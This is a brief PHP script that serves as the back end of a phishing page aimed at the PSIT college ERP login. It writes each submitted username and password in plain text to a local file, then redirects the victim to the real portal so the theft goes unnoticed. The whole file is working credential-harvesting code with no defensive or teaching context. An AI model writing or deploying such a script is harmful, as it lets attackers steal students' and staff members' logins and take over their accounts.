<?php 
file_put_contents("usernames.txt", "PSIT Username: " . $_POST['username'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://erp.psitche.ac.in/');
exit();
?>
